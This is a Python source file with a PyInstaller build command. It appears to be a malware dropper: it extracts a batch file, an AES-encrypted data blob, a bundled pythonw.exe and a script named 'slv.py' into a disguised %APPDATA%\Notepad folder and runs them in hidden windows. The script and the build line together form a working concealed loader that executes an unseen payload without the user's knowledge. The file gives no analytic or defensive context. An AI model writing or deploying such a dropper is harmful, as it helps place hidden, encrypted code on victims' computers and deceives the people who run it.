import os
import sys
import subprocess

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def extract_and_execute():
    appdata_path = os.getenv('APPDATA')
    target_folder = os.path.join(appdata_path, 'Notepad')
    os.makedirs(target_folder, exist_ok=True)
    
    files = {
        'pycryptodome.bat': resource_path('resources/pycryptodome.bat'),
        'data.aes': resource_path('resources/data.aes'),
        'pythonw.exe': resource_path('resources/pythonw.exe'),
        'slv.py': resource_path('resources/slv.py')
    }
    
    for dest_name, src_path in files.items():
        try:
            with open(src_path, 'rb') as src_file:
                content = src_file.read()
            
            dest_path = os.path.join(target_folder, dest_name)
            with open(dest_path, 'wb') as dest_file:
                dest_file.write(content)
        except Exception as e:
            print(f"Failed to extract {dest_name}: {str(e)}")
    
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        # Run pycryptodome.bat and wait for it to finish
        bat_path = os.path.join(target_folder, 'pycryptodome.bat')
        subprocess.run(bat_path, startupinfo=startupinfo, shell=False)
        
        # After the batch file finishes, run slv.py
        slv_path = os.path.join(target_folder, 'slv.py')
        subprocess.Popen(["python3", slv_path], startupinfo=startupinfo, shell=False)
        
    except Exception as e:
        print(f"Execution failed: {str(e)}")

if __name__ == "__main__":
    extract_and_execute()
    
    
'''
pyinstaller --onefile --add-data "resources/pycryptodome.bat;resources" --add-data "resources/data.aes;resources" --add-data "resources/pythonw.exe;resources"  --add-data "resources/slv.py;resources"  main.py
'''